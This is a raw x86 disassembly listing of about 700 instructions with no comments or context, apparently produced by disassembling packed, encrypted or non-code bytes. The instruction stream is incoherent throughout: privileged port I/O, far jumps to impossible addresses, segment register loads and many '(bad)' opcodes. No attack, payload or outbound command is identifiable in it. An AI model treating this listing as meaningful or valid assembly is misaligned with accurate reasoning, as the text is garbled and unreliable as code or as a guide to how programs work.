  4198a6:	mov    eax,0x88ce54ac
  4198ab:	mov    esi,0x96de72be
  4198b0:	out    0xa3,al
  4198b2:	dec    esi
  4198b3:	loop   0x4198ac
  4198b5:	jmp    0x23350c32
  4198ba:	and    esp,esi
  4198bc:	mov    WORD PTR [edi+0x75],fs
  4198bf:	adc    al,0x17
  4198c1:	call   0x8ea92b41
  4198c6:	jl     0x4198a3
  4198c8:	pop    ecx
  4198c9:	or     ecx,DWORD PTR [esi+edx*1+0x3cd1d23]
  4198d0:	imul   eax,DWORD PTR [ebx],0x2ff7d642
  4198d6:	in     al,dx
  4198d7:	das    
  4198d8:	neg    DWORD PTR [esi]
  4198da:	mov    eax,ebx
  4198dc:	jp     0x419923
  4198de:	pop    ebp
  4198df:	or     cl,al
  4198e1:	dec    esi
  4198e2:	dec    esp
  4198e3:	push   esp
  4198e4:	stos   BYTE PTR es:[edi],al
  4198e5:	inc    ecx
  4198e6:	or     al,0x5c
  4198e8:	or     BYTE PTR [ecx+0x3dd8096e],bl
  4198ee:	mov    dh,0x2f
  4198f0:	out    0xee,al
  4198f2:	mov    edi,0x7cd9ec34
  4198f7:	ins    BYTE PTR es:[edi],dx
  4198f8:	inc    esp
  4198f9:	retf   
  4198fa:	inc    edx
  4198fb:	ret    0x23b0
  4198fe:	je     0x4198b2
  419900:	les    edi,FWORD PTR [ebp-0xcadbb11]
  419906:	fs addr16 inc esi
  419909:	pop    ebp
  41990a:	dec    edi
  41990b:	lods   al,BYTE PTR ds:[esi]
  41990c:	popa   
  41990d:	push   ecx
  41990e:	loope  0x419983
  419910:	xchg   BYTE PTR [edi+0x2a],ch
  419913:	bound  ebx,QWORD PTR [ecx-0x6f625430]
  419919:	popa   
  41991a:	arpl   WORD PTR [edx],sp
  41991c:	repnz push ecx
  41991e:	mov    bh,0xc6
  419920:	aas    
  419921:	repnz xchg edi,esi
  419924:	inc    ebx
  419925:	retf   
  419926:	lock add BYTE PTR [eax],bl
  419929:	das    
  41992a:	mov    es,WORD PTR [edx+0x4f]
  41992d:	sbb    edx,0x1b
  419930:	or     eax,0x8ea4d857
  419935:	imul   esp,DWORD PTR [esp+edi*4+0x2cf0d971],0x5c
  41993d:	pop    edx
  41993e:	clc    
  41993f:	inc    edx
  419940:	out    0xaa,al
  419942:	adc    eax,0x80ac8109
  419947:	sar    DWORD PTR [esi+0x5a938b06],0x29
  41994e:	aam    0xe3
  419950:	jmp    0x4199a4
  419952:	in     al,dx
  419953:	and    BYTE PTR [esi],al
  419955:	sbb    ebp,DWORD PTR [eax]
  419957:	jno    0x419960
  419959:	mov    esi,0xfa89f582
  41995e:	lods   eax,DWORD PTR ds:[esi]
  41995f:	fsubr  st,st(6)
  419961:	rcl    BYTE PTR [ecx-0x26],0xef
  419965:	inc    edi
  419966:	scas   eax,DWORD PTR es:[edi]
  419967:	sbb    BYTE PTR [ecx],cl
  419969:	jge    0x419958
  41996b:	ins    BYTE PTR es:[edi],dx
  41996c:	test   BYTE PTR [eax+0x5dd8d3f3],cl
  419972:	adc    DWORD PTR [ecx+0x29fac8e6],ebp
  419978:	repnz xchg ecx,eax
  41997a:	out    0xcf,al
  41997c:	hlt    
  41997d:	ds jne 0x41994f
  419980:	push   es
  419981:	leave  
  419982:	fcmovbe st,st(4)
  419984:	loope  0x419a04
  419986:	inc    esp
  419987:	and    BYTE PTR [edx+0x51],dl
  41998a:	mov    cl,0xa7
  41998c:	mov    esp,0xbe17cb62
  419991:	jno    0x41991d
  419993:	sbb    DWORD PTR [esi-0x79],esp
  419996:	sub    DWORD PTR [ecx+0x78cc12c2],ebx
  41999c:	sbb    eax,0x560b40b2
  4199a1:	xor    dl,BYTE PTR [edx+ecx*4-0x6acebfdd]
  4199a8:	jg     0x4199b2
  4199aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199ab:	mov    ds:0x4a821578,al
  4199b0:	jno    0x419960
  4199b2:	push   ebx
  4199b3:	lds    edi,FWORD PTR fs:[eax]
  4199b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199b7:	jae    0x419939
  4199b9:	mov    gs,WORD PTR [edi+0x3f]
  4199bc:	adc    dh,dh
  4199be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199bf:	jae    0x4199f7
  4199c1:	imul   ecx,DWORD PTR [edi-0x3f1403ae],0x69
  4199c8:	iret   
  4199c9:	mov    bl,0xbc
  4199cb:	xor    eax,0x3db279a3
  4199d0:	es cli 
  4199d2:	sub    DWORD PTR [edi-0x7933c3fa],edi
  4199d8:	push   ebp
  4199d9:	push   esi
  4199da:	mov    edx,0x1f2e3cd2
  4199df:	xchg   ebp,eax
  4199e0:	add    DWORD PTR [ebp-0x6c],esp
  4199e3:	add    al,0x36
  4199e5:	imul   ebp,DWORD PTR [edx+0x154c8e43],0xee597c63
  4199ef:	stos   DWORD PTR es:[edi],eax
  4199f0:	mov    al,ds:0xa291a8b7
  4199f5:	inc    edx
  4199f6:	ja     0x419a3a
  4199f8:	pop    esp
  4199f9:	sub    al,0xc7
  4199fb:	jmp    0x4199d9
  4199fd:	jp     0x419a42
  4199ff:	pop    ss
  419a00:	mov    dh,0xca
  419a02:	cli    
  419a03:	or     DWORD PTR [edi-0x789e0bb1],ebx
  419a09:	icebp  
  419a0a:	pop    ebp
  419a0b:	es push eax
  419a0d:	in     al,dx
  419a0e:	sbb    eax,0x5e0d5ed4
  419a13:	xchg   DWORD PTR [edi-0x16],edi
  419a16:	mov    edx,0x40b0616d
  419a1b:	cld    
  419a1c:	and    eax,0x41a15736
  419a21:	imul   eax,eax,0x5b
  419a24:	enter  0x8417,0xe3
  419a28:	pop    edi
  419a29:	mov    ch,0xbf
  419a2b:	jg     0x419a94
  419a2d:	pop    esp
  419a2e:	enter  0xcba1,0x77
  419a32:	in     eax,dx
  419a33:	sub    al,0xf1
  419a35:	leave  
  419a36:	pop    ss
  419a37:	pop    edi
  419a38:	mov    dl,0x80
  419a3a:	pop    ds
  419a3b:	clc    
  419a3c:	data16 (bad) 
  419a3e:	loopne 0x4199c5
  419a40:	out    dx,al
  419a41:	je     0x4199f0
  419a43:	lea    edi,[edi-0x55436558]
  419a49:	pop    esp
  419a4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a4b:	in     eax,dx
  419a4c:	sbb    eax,0xef5df8da
  419a51:	(bad)  
  419a52:	jnp    0x419a93
  419a54:	xor    dh,BYTE PTR [edx]
  419a56:	jae    0x419ad6
  419a58:	arpl   WORD PTR [ecx+0xb4167b3],cx
  419a5e:	je     0x419a27
  419a60:	jae    0x419ac5
  419a62:	call   0x9bfbb0f2
  419a67:	mul    ebp
  419a69:	cmp    eax,0x429b439c
  419a6e:	clc    
  419a6f:	xor    al,0x6e
  419a71:	cmp    eax,0x9faf358d
  419a76:	jne    0x419af7
  419a78:	inc    edx
  419a79:	or     eax,0xc7a002b
  419a7e:	shl    cl,1
  419a80:	dec    esi
  419a81:	call   0x428a:0xeef1830e
  419a88:	sahf   
  419a89:	xchg   edx,eax
  419a8a:	or     BYTE PTR [ebx],bl
  419a8c:	sub    al,0x83
  419a8e:	sqrtps xmm5,xmm5
  419a91:	sbb    ecx,DWORD PTR [edx+0x49dc9cd0]
  419a97:	inc    ebx
  419a98:	ja     0x419aba
  419a9a:	fist   WORD PTR [edx]
  419a9c:	(bad)  
  419a9e:	sbb    ch,bl
  419aa0:	push   es
  419aa1:	fadd   DWORD PTR [ebx+0x76a8c8c0]
  419aa7:	jmp    0x5f0820ed
  419aac:	and    eax,0x378adeab
  419ab1:	xlat   BYTE PTR ds:[ebx]
  419ab2:	jle    0x419a5b
  419ab4:	dec    esi
  419ab5:	xchg   edi,eax
  419ab6:	adc    al,0xfa
  419ab8:	xor    al,BYTE PTR ds:0xa9c3f8d2
  419abe:	ins    DWORD PTR es:[edi],dx
  419abf:	aaa    
  419ac0:	gs pop es
  419ac2:	pop    ds
  419ac3:	add    eax,0x26809b8f
  419ac8:	mov    esi,0x87f66546
  419acd:	fdivr  QWORD PTR [esp+eax*1]
  419ad0:	test   DWORD PTR [edi+ebx*2-0x79],ebp
  419ad4:	mov    dh,BYTE PTR [ebp-0x62]
  419ad7:	lds    esp,FWORD PTR [edx+0x16]
  419ada:	adc    eax,0xb0f17d61
  419adf:	into   
  419ae0:	out    dx,al
  419ae1:	mov    cs,WORD PTR [esi-0x2aa22f42]
  419ae7:	or     dl,BYTE PTR [esi]
  419ae9:	mov    eax,0x971a44dd
  419aee:	push   edx
  419aef:	mov    dh,0x29
  419af1:	jne    0x419aff
  419af3:	test   DWORD PTR [ebp+0x37],esi
  419af6:	cs std 
  419af8:	out    dx,eax
  419af9:	leave  
  419afa:	out    dx,eax
  419afb:	push   edx
  419afc:	loope  0x419b45
  419afe:	sbb    BYTE PTR ds:0xc805b554,al
  419b04:	fwait
  419b05:	xor    eax,0x6f7f3d77
  419b0a:	push   ebx
  419b0b:	aam    0x37
  419b0d:	inc    esp
  419b0e:	mov    ebp,0xe4538c4f
  419b13:	gs jno 0x419b4f
  419b16:	test   al,0xe0
  419b18:	imul   esp,DWORD PTR [esi+0x4bbbf0f8],0x55
  419b1f:	or     dh,BYTE PTR [esi+0x23]
  419b22:	cli    
  419b23:	mov    esi,0xcf102bbc
  419b28:	xor    esp,ebp
  419b2a:	test   eax,0xe13a6890
  419b2f:	jge    0x419b16
  419b31:	scas   al,BYTE PTR es:[edi]
  419b32:	jae    0x419b20
  419b34:	fdivr  QWORD PTR [eax-0x56]
  419b37:	cli    
  419b38:	lds    ecx,FWORD PTR [ebp+0x7aca9089]
  419b3e:	mov    BYTE PTR [edx],cl
  419b40:	(bad)  
  419b41:	jmp    0x419afb
  419b43:	mov    dh,0xe4
  419b45:	lock cld 
  419b47:	mov    DWORD PTR [ebx-0x4e294ceb],ecx
  419b4d:	jp     0x419b4e
  419b4f:	xchg   esp,eax
  419b50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b51:	(bad)  
  419b52:	(bad)  [ebx]
  419b54:	dec    edx
  419b55:	push   cs
  419b56:	cs sbb bh,bh
  419b59:	and    ebx,DWORD PTR [edi+0x11]
  419b5c:	jno    0x419baa
  419b5e:	sub    eax,DWORD PTR [ebp+0x73]
  419b61:	push   esp
  419b62:	shl    DWORD PTR [esi-0x659ff8e0],1
  419b68:	(bad)  
  419b69:	cld    
  419b6a:	or     DWORD PTR [ecx],edx
  419b6c:	in     al,0xbd
  419b6e:	mov    cl,BYTE PTR [esi-0x19029fdb]
  419b74:	push   cs
  419b75:	gs xor esi,ebp
  419b78:	gs inc esp
  419b7a:	sub    ah,BYTE PTR ds:0xc8dc3062
  419b80:	push   cs
  419b81:	outs   dx,DWORD PTR ds:[esi]
  419b82:	inc    ebp
  419b83:	jge    0x419bed
  419b85:	pop    ebp
  419b86:	neg    DWORD PTR [esp+esi*2-0xc1c1aa4]
  419b8d:	data16 lods al,BYTE PTR ds:[esi]
  419b8f:	mov    esi,0x60ff8bab
  419b94:	xchg   ebx,eax
  419b95:	ins    BYTE PTR es:[edi],dx
  419b96:	add    al,0xdb
  419b98:	(bad)  
  419b99:	mov    cl,0xe6
  419b9b:	retf   
  419b9c:	mov    edx,?
  419b9e:	test   BYTE PTR [esi-0x7c6a673d],ah
  419ba4:	jmp    0xa1f9:0xd1a00cc8
  419bab:	push   edx
  419bac:	rol    BYTE PTR [ebx],0x5e
  419baf:	jle    0x419b43
  419bb1:	push   es
  419bb2:	lahf   
  419bb3:	test   BYTE PTR [edi-0x7da73bc3],al
  419bb9:	es pop esi
  419bbb:	outs   dx,BYTE PTR ds:[esi]
  419bbc:	js     0x419b46
  419bbe:	cmp    esp,ebx
  419bc0:	std    
  419bc1:	add    edx,DWORD PTR [edi+0x4148b752]
  419bc7:	xchg   ebx,eax
  419bc8:	rol    dh,cl
  419bca:	imul   ebx,DWORD PTR [ecx+ebx*2-0x7e3680b8],0xffffff99
  419bd2:	imul   edi,DWORD PTR [esi],0x70
  419bd5:	inc    esp
  419bd6:	aaa    
  419bd7:	adc    eax,0xffffff83
  419bda:	ins    DWORD PTR es:[edi],dx
  419bdb:	outs   dx,BYTE PTR ds:[esi]
  419bdc:	add    al,0x4e
  419bde:	pop    ebx
  419bdf:	xor    ch,BYTE PTR [edx-0x68]
  419be2:	mov    ds:0x2cc1c204,al
  419be7:	jl     0x419c10
  419be9:	push   0x4a
  419beb:	xor    al,0x68
  419bed:	dec    ebp
  419bee:	mov    cl,0x8
  419bf0:	daa    
  419bf1:	jb     0x419bfe
  419bf3:	push   ss
  419bf4:	out    dx,eax
  419bf5:	fs cmp al,0x7a
  419bf8:	hlt    
  419bf9:	imul   esp,DWORD PTR [ecx+eax*1+0x605f62d],0xffffffb4
  419c01:	std    
  419c02:	mov    al,ds:0x2498af3
  419c07:	xchg   edi,eax
  419c08:	rol    DWORD PTR [ebp+0x5d4c5631],1
  419c0e:	jp     0x419c01
  419c10:	dec    ebp
  419c11:	jnp    0x419c70
  419c13:	sub    eax,0x1f2aafc8
  419c18:	nop/reserved BYTE PTR [esi+eax*1]
  419c1c:	pop    ecx
  419c1d:	cs dec edx
  419c1f:	mov    bh,BYTE PTR [edx-0x1ad84564]
  419c25:	cmp    dh,BYTE PTR [ebp-0x29012c74]
  419c2b:	sub    al,0xcf
  419c2d:	into   
  419c2e:	aad    0x28
  419c30:	mov    ah,0x4a
  419c32:	sahf   
  419c33:	lods   eax,DWORD PTR ds:[esi]
  419c34:	in     eax,dx
  419c35:	fs ins BYTE PTR es:[edi],dx
  419c37:	cmp    ebx,0x4a
  419c3a:	jb     0x419cb7
  419c3c:	lahf   
  419c3d:	in     eax,0xc9
  419c3f:	divps  xmm5,XMMWORD PTR [eax-0x4c]
  419c43:	xchg   edx,eax
  419c44:	fs lahf 
  419c46:	sub    DWORD PTR [edi],edi
  419c48:	dec    edx
  419c49:	sub    BYTE PTR [edx-0x27],ah
  419c4c:	xchg   DWORD PTR [edx-0x69dc89b6],edx
  419c52:	jge    0x419c68
  419c54:	push   ebx
  419c55:	jb     0x419c40
  419c57:	and    DWORD PTR [ebx+0xd82c1c6],0x32434f61
  419c61:	xchg   ebx,eax
  419c62:	cmp    ch,BYTE PTR [ecx+0x2b]
  419c65:	push   ecx
  419c66:	push   eax
  419c67:	inc    esi
  419c68:	mov    esp,0x6bafdc74
  419c6d:	mov    DWORD PTR [edx+0x35],eax
  419c70:	imul   ebp,DWORD PTR [esi+0x4d],0x1f951017
  419c77:	(bad)  
  419c78:	rcr    BYTE PTR [ebx-0x11],cl
  419c7b:	ds retf 0x8a19
  419c7f:	out    0x99,eax
  419c81:	popa   
  419c82:	and    bl,BYTE PTR [eax]
  419c84:	pop    ecx
  419c85:	inc    edx
  419c86:	ret    0x78bb
  419c89:	out    dx,eax
  419c8a:	fiadd  DWORD PTR [edx+0x3307af5e]
  419c90:	cmp    dh,BYTE PTR [eax+0x1d]
  419c93:	or     cl,bh
  419c95:	fsub   DWORD PTR [ebx]
  419c97:	xchg   esi,eax
  419c98:	(bad)  
  419c99:	mov    al,0x36
  419c9b:	and    al,0x34
  419c9d:	(bad)  
  419c9e:	in     eax,dx
  419c9f:	inc    ebp
  419ca0:	xchg   ebp,eax
  419ca1:	lods   eax,DWORD PTR ds:[esi]
  419ca2:	mov    WORD PTR [esi+0x20],?
  419ca5:	ja     0x419caa
  419ca7:	test   DWORD PTR [esi],ebx
  419ca9:	push   eax
  419caa:	jns    0x419c30
  419cac:	jns    0x419d27
  419cae:	outs   dx,DWORD PTR ds:[esi]
  419caf:	hlt    
  419cb0:	push   ecx
  419cb1:	push   edx
  419cb2:	out    dx,al
  419cb3:	jl     0x419cce
  419cb5:	mov    ds:0xcd708308,eax
  419cba:	xchg   ecx,eax
  419cbb:	call   0xd834008f
  419cc0:	xchg   ebp,eax
  419cc1:	push   ecx
  419cc2:	lds    ebp,FWORD PTR [eax-0x4460ab33]
  419cc8:	fidiv  WORD PTR [edi+0x42]
  419ccb:	loopne 0x419c58
  419ccd:	cmp    al,0xc4
  419ccf:	mov    esp,esp
  419cd1:	es pop ebx
  419cd3:	in     al,dx
  419cd4:	push   ecx
  419cd5:	or     ch,bl
  419cd7:	add    al,0x82
  419cd9:	movntps XMMWORD PTR [edi+ecx*8],xmm6
  419cdd:	test   eax,0x8962a66f
  419ce2:	mov    bh,0x7b
  419ce4:	test   al,0xcf
  419ce6:	fisttp WORD PTR [eax-0x6f]
  419ce9:	adc    eax,0xffffffd8
  419cec:	xor    al,BYTE PTR [ebx+0x904fcdb]
  419cf2:	gs adc al,0xd2
  419cf5:	adc    ch,BYTE PTR [edx-0x76]
  419cf8:	add    al,ah
  419cfa:	adc    ah,BYTE PTR [esi-0x20e8e4a3]
  419d00:	jge    0x419d64
  419d02:	pop    ds
  419d03:	arpl   WORD PTR [ebp-0x1b],di
  419d06:	das    
  419d07:	imul   ebp,DWORD PTR [edx-0x5c],0x42
  419d0b:	iret   
  419d0c:	addr16 mov edi,0x334bf462
  419d12:	dec    ebp
  419d13:	test   eax,0xd3877baf
  419d18:	push   cs
  419d19:	sub    al,BYTE PTR [edi-0x5e]
  419d1c:	push   esi
  419d1d:	mov    ds:0x2b1afb12,eax
  419d22:	xchg   BYTE PTR [edx+0x3e775a35],cl
  419d28:	push   eax
  419d29:	imul   ecx,DWORD PTR [edx],0xee697672
  419d2f:	push   esi
  419d30:	push   esi
  419d31:	inc    ebx
  419d32:	mov    ?,WORD PTR [ecx-0x493aa060]
  419d38:	mov    ah,0x3d
  419d3a:	jbe    0x419d1d
  419d3c:	xchg   ch,ch
  419d3e:	retf   0xb128
  419d41:	mov    esi,0xb73e39ee
  419d46:	retf   
  419d47:	(bad)  
  419d49:	sbb    edx,edi
  419d4b:	mov    edi,0x70361036
  419d50:	sub    BYTE PTR [ebp+ecx*1-0x57],dl
  419d54:	fsub   st(1),st
  419d56:	sub    DWORD PTR [esi],eax
  419d58:	cmp    esp,DWORD PTR [edi]
  419d5a:	cdq    
  419d5b:	sbb    BYTE PTR [esi+eax*2-0x2c],ah
  419d5f:	add    al,0x6e
  419d61:	cmp    BYTE PTR [edx-0x6b],bl
  419d64:	ret    
  419d65:	xor    cl,BYTE PTR [ebx]
  419d67:	jb     0x419d84
  419d69:	xchg   ebp,eax
  419d6a:	adc    edx,DWORD PTR [edx]
  419d6c:	hlt    
  419d6d:	jle    0x419cff
  419d6f:	out    0x9c,eax
  419d71:	or     esp,esp
  419d73:	inc    edi
  419d74:	test   eax,esi
  419d76:	mov    ecx,0x33af1dc1
  419d7b:	and    dl,BYTE PTR [ebp-0x69]
  419d7e:	(bad)  
  419d80:	jp     0x419d23
  419d82:	ins    DWORD PTR es:[edi],dx
  419d83:	pop    eax
  419d84:	pop    ecx
  419d85:	js     0x419d4a
  419d87:	ja     0x419d62
  419d89:	pop    eax
  419d8a:	rcr    DWORD PTR [edi-0x3e],cl
  419d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d8e:	jae    0x419d2a
  419d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d91:	fldenv [ecx-0x1]
  419d94:	loope  0x419db2
  419d96:	cs mov bl,0x76
  419d99:	inc    edi
  419d9a:	test   al,0xbc
  419d9c:	inc    esi
  419d9d:	sub    eax,0xdf4835c3
  419da2:	cli    
  419da3:	mov    dh,0x71
  419da5:	or     eax,DWORD PTR [edx-0x6702f38b]
  419dab:	cdq    
  419dac:	mov    ch,0xce
  419dae:	xor    BYTE PTR [ecx-0x7b088093],dl
  419db4:	mov    eax,0xb80550f3
  419db9:	xchg   eax,ecx
  419dbb:	mov    esp,0x8b00f642
  419dc0:	pop    edx
  419dc1:	outs   dx,BYTE PTR gs:[esi]
  419dc3:	out    0x73,al
  419dc5:	popa   
  419dc6:	fs cli 
  419dc8:	push   ss
  419dc9:	hlt    
  419dca:	in     al,dx
  419dcb:	outs   dx,BYTE PTR ds:[esi]
  419dcc:	jge    0x419d66
  419dce:	les    edi,FWORD PTR [ebx]
  419dd0:	xchg   edi,eax
  419dd1:	push   ebx
  419dd2:	jns    0x419dd9
  419dd4:	adc    eax,0xc1ec4dcd
  419dd9:	mov    edi,0x80c964f5
  419dde:	inc    ecx
  419ddf:	aas    
  419de0:	icebp  
  419de1:	je     0x419d8e
  419de3:	xchg   edi,eax
  419de4:	aad    0xac
  419de6:	sti    
  419de7:	shl    BYTE PTR [ebp+0x7cb8031b],0xea
  419dee:	xchg   esp,eax
  419def:	pop    ss
  419df0:	mov    ah,0xb1
  419df2:	fisub  WORD PTR [edx+0x18d4eab5]
  419df8:	adc    al,0x23
  419dfa:	repnz ds sahf 
  419dfd:	sbb    edi,DWORD PTR [edi+0x3e]
  419e00:	mov    ch,0x9a
  419e02:	(bad)  
  419e03:	or     eax,0x1ae4f5eb
  419e08:	test   eax,0xb9672525
  419e0d:	push   edi
  419e0e:	jge    0x419df7
  419e10:	mov    edx,0x45d1a802
  419e15:	jecxz  0x419dc8
  419e17:	sub    dh,BYTE PTR [eax]
  419e19:	ins    BYTE PTR es:[edi],dx
  419e1a:	cs mov bl,0x61
  419e1d:	add    eax,0x83c40d34
  419e22:	pop    eax
  419e23:	push   ss
  419e24:	sub    al,0xbf
  419e26:	adc    cl,al
  419e28:	popf   
  419e29:	imul   esi,ecx,0xfd7a698e
  419e2f:	jb     0x419e66
  419e31:	dec    ebp
  419e32:	loope  0x419e88
  419e34:	jmp    0x419e82
  419e36:	cli    
  419e37:	jmp    FWORD PTR [esi+0x70c76d7a]
  419e3d:	cmp    ah,BYTE PTR [ebx-0x27a4a0da]
  419e43:	pop    es
  419e44:	std    
  419e45:	call   0x8980c21f
  419e4a:	or     ch,bh
  419e4c:	loopne 0x419ebf
  419e4e:	repz inc eax
  419e50:	ret    
  419e51:	ins    DWORD PTR es:[edi],dx
  419e52:	sbb    ebx,edi
  419e54:	test   BYTE PTR [ecx+eax*1+0x26f23c81],cl
  419e5b:	add    al,0x51
  419e5d:	mov    edx,0x6817e2aa
  419e62:	inc    ecx
  419e63:	js     0x419e2e
  419e65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e66:	stc    
  419e67:	lds    ebp,FWORD PTR ds:0x8e335718
  419e6d:	jmp    0x419e74
  419e6f:	xchg   ah,dh
  419e71:	inc    edx
  419e72:	jnp    0x419e48
  419e74:	clc    
  419e75:	shl    BYTE PTR [ecx-0x3880454e],0xfa
  419e7c:	push   ecx
  419e7d:	test   eax,0x16b9b6ad
  419e82:	shl    BYTE PTR [eax],1
  419e84:	(bad)  
  419e86:	xchg   BYTE PTR [ecx+ebx*4],ah
  419e89:	push   0xffffffcb
  419e8b:	test   al,0x1
  419e8d:	cld    
  419e8e:	sbb    al,0x72
  419e90:	daa    
  419e91:	mov    ch,0x24
  419e93:	mov    dl,dl
  419e95:	and    al,0x97
  419e97:	pop    es
  419e98:	sub    eax,0xd229e068
  419e9d:	jp     0x419e34
  419e9f:	mov    al,0xea
  419ea1:	push   es
  419ea2:	mov    edx,0x2a18a300
  419ea7:	out    dx,eax
  419ea8:	ret    
  419ea9:	push   esi
  419eaa:	iret   
  419eab:	mov    DWORD PTR [ebp+eax*8-0xd396851],esp
  419eb2:	xchg   ebx,eax
  419eb3:	pop    edi
  419eb4:	mov    eax,ds:0x81217a6d
  419eb9:	mov    DWORD PTR [esi+0x85f701c],edx
  419ebf:	fdiv   st,st(0)
  419ec1:	fld    QWORD PTR [edi-0x19]
  419ec4:	adc    DWORD PTR [ebx+0x44],eax
  419ec7:	adc    eax,0x6e5c180e
  419ecc:	push   cs
  419ecd:	sbb    eax,DWORD PTR [esi]
  419ecf:	lea    edi,[edx+0x25da4ea3]
  419ed5:	jmp    0x419e8a
  419ed7:	pop    esp
  419ed8:	and    BYTE PTR [ebx+0x52],bl
  419edb:	jo     0x419e71
  419edd:	ret    
  419ede:	fs js  0x419ed9
  419ee1:	int    0x99
  419ee3:	mov    ds:0xc94e89d8,al
  419ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ee9:	add    bl,BYTE PTR [ebp+0x26]
  419eec:	inc    esp
  419eed:	fld    QWORD PTR [esi-0x5b]
  419ef0:	test   al,0x2c
  419ef2:	pusha  
  419ef3:	fidivr DWORD PTR [edi-0x49]
  419ef6:	test   DWORD PTR [esi-0x687f5552],eax
  419efc:	(bad)  
  419efe:	ins    DWORD PTR es:[edi],dx
  419eff:	pushf  
  419f00:	out    0x32,al
  419f02:	(bad)  
  419f03:	xchg   ecx,eax
  419f04:	outs   dx,BYTE PTR ds:[esi]
  419f05:	push   esp
  419f06:	inc    eax
  419f07:	call   0x966182a7
  419f0c:	loope  0x419f2c
  419f0e:	cdq    
  419f0f:	inc    edx
  419f10:	and    eax,0x5c8b9dae
  419f15:	test   al,0xf4
  419f17:	sbb    al,0xbb
  419f19:	pop    ss
  419f1a:	push   ss
  419f1b:	cmp    BYTE PTR [edi],dl
  419f1d:	inc    esp
  419f1e:	dec    esi
  419f1f:	cdq    
  419f20:	or     BYTE PTR [ebp-0x1124e04b],ah
  419f26:	push   edx
  419f27:	addr16 data16 sbb al,0x5b
  419f2b:	jae    0x419f45
  419f2d:	push   edx
  419f2e:	pop    eax
  419f2f:	jge    0x419f4f
  419f31:	int3   
  419f32:	add    eax,0xfa8d73ce
  419f37:	or     dl,BYTE PTR ds:0x7db88a59
  419f3d:	test   eax,0x1c0f5748
  419f42:	jne    0x419f9e
  419f44:	xchg   ecx,ecx
  419f46:	leave  
  419f47:	inc    ebx
  419f48:	push   esp
  419f49:	aas    
  419f4a:	leave  
  419f4b:	mov    dh,0x8
  419f4d:	stos   DWORD PTR es:[edi],eax
  419f4e:	sbb    bh,BYTE PTR [esi+ebp*1-0x79d19a10]
  419f55:	in     al,dx
  419f56:	jmp    0x6c7b3cce
  419f5b:	data16 jge 0x419ee8
  419f5e:	idiv   DWORD PTR [ecx]
  419f60:	add    eax,0x19bad63c
  419f65:	sbb    DWORD PTR [ecx+edi*2-0xef2b2a3],edx
  419f6c:	aas    
  419f6d:	leave  
  419f6e:	dec    DWORD PTR [edi+0xbd384dc]
  419f74:	fnstenv [ebx+0xc]
  419f77:	jae    0x419f02
  419f79:	mov    esi,0x627b252e
  419f7e:	je     0x419fcf
  419f80:	cmc    
  419f81:	iret   
  419f82:	sub    eax,DWORD PTR [esi]
  419f84:	dec    esi
  419f85:	mov    dh,0x84
  419f87:	adc    edx,DWORD PTR [edi-0x2abcee49]
  419f8d:	xchg   edi,ebx
  419f8f:	retf   0xb39
  419f92:	jg     0x419f64
  419f94:	pop    edx
  419f95:	cmp    al,dh
  419f97:	call   0x7158:0xccb8fad8
  419f9e:	add    eax,0xa17954bd
  419fa3:	jbe    0x41a020
  419fa5:	loopne 0x419fb6
  419fa7:	adc    ebp,DWORD PTR [eax]
  419fa9:	xchg   edi,eax
  419faa:	nop
  419fab:	dec    esi
  419fac:	xchg   edi,eax
  419fad:	dec    esi
  419fae:	sbb    DWORD PTR [ebp-0x5f],0x7f3187af
  419fb5:	pop    ss
  419fb6:	call   0x96b610d2
  419fbb:	cmp    ecx,DWORD PTR [eax]
  419fbd:	pop    esp
  419fbe:	(bad)  
  419fbf:	lea    ebx,[edx]
  419fc1:	cmc    
  419fc2:	std    
  419fc3:	loope  0x419fde
  419fc5:	jge    0x419f6a
  419fc7:	xor    eax,0xeb9349f8
  419fcc:	jae    0x419f7d
  419fce:	xlat   BYTE PTR ds:[ebx]
  419fcf:	neg    BYTE PTR [esi]
  419fd1:	bound  ebx,QWORD PTR [ecx+0x2a]
  419fd4:	cmp    dl,BYTE PTR ds:0xa42cfea9
  419fda:	cdq    
  419fdb:	mov    al,ds:0x7b243859
  419fe0:	mov    ds,WORD PTR [esp+eax*1-0x26]
  419fe4:	(bad)  
  419fe5:	mov    ss,WORD PTR [ecx-0x3bc3d996]
  419feb:	nop
  419fec:	int3   
  419fed:	pop    edx
  419fee:	sbb    DWORD PTR [ebx+0x31],ebp
  419ff1:	pop    ecx
  419ff2:	mov    ebp,0x22be8635
  419ff7:	sbb    DWORD PTR [esi-0x4e],eax
  419ffa:	mov    DWORD PTR [ecx],ecx
  419ffc:	mov    esp,0x215bed09
  41a001:	addr16 mov cl,0xcd
  41a004:	mov    edx,0x969e959e
  41a009:	icebp  
  41a00a:	and    BYTE PTR [edi],ch
  41a00c:	or     eax,DWORD PTR cs:[edx+0x22]
  41a010:	leave  
  41a011:	push   edi
  41a012:	stos   DWORD PTR es:[edi],eax
  41a013:	mov    bl,BYTE PTR [esi+edi*1]
  41a016:	sti    
  41a017:	js     0x419fc7
  41a019:	cdq    
  41a01a:	pop    esi
  41a01b:	or     al,0xa2
  41a01d:	call   0x9cce:0x96965791
  41a024:	mov    bl,0xb3
  41a026:	mov    bl,al
  41a028:	jmp    0x952ae263
  41a02d:	sahf   
  41a02e:	jge    0x41a06b
  41a030:	xor    al,0xd1
  41a032:	int    0x76
  41a034:	push   cs
  41a035:	push   0xd
  41a037:	push   edx
  41a038:	in     eax,0x7f
  41a03a:	ja     0x419fc6
  41a03c:	or     dh,BYTE PTR [ebx]
  41a03e:	gs xchg esi,eax
  41a040:	aam    0xf9
  41a042:	stc    
  41a043:	and    DWORD PTR [eax-0x7b],ecx
  41a046:	out    0xc5,al
  41a048:	push   esp
  41a049:	jno    0x41a08a
  41a04b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a04c:	in     al,0xc5
  41a04e:	out    0xb0,eax
  41a050:	icebp  
  41a051:	inc    ecx
  41a052:	(bad)  
  41a053:	or     dl,cl
  41a055:	jmp    0xbf3f:0x3e8a738f
